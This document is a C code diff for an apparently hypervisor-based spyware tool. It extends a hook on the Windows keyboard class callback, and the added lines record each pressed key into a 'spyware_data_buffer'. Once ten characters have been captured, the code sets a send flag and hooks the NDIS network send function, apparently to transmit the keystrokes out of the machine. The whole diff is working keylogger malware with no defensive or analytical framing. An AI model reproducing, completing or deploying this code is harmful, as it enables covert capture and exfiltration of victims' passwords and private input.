@@ -54,8 +54,17 @@ __attribute__((section(".vmm"))) void handle_KeyboardClassServiceCallback_hook(v
     KEYBOARD_INPUT_DATA *data_phys;
     for (; InputDataStart < InputDataEnd; InputDataStart++){
         data_phys = guest_virtual_to_physical(InputDataStart);
-        if (data_phys->Flags == KEY_MAKE)
+        if (data_phys->Flags == KEY_MAKE){
             LOG_INFO("Key pressed: %c\n", kbd_US[data_phys->MakeCode]);
+            AcquireLock(&shared_cores_data.spyware_data_lock);
+            shared_cores_data.spyware_data_buffer.chars[shared_cores_data.spyware_data_buffer.length] = kbd_US[data_phys->MakeCode];
+            shared_cores_data.spyware_data_buffer.length++;
+            if (shared_cores_data.spyware_data_buffer.length >= 10){
+                shared_cores_data.send_pending = TRUE;
+                hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_NdisSendNetBufferLists_OFFSET));
+            } 
+            ReleaseLock(&shared_cores_data.spyware_data_lock);
+        }
         else if (data_phys->Flags == KEY_BREAK)
             continue;
             // LOG_INFO("Key released: %c\n", kbd_US[data_phys->MakeCode]);
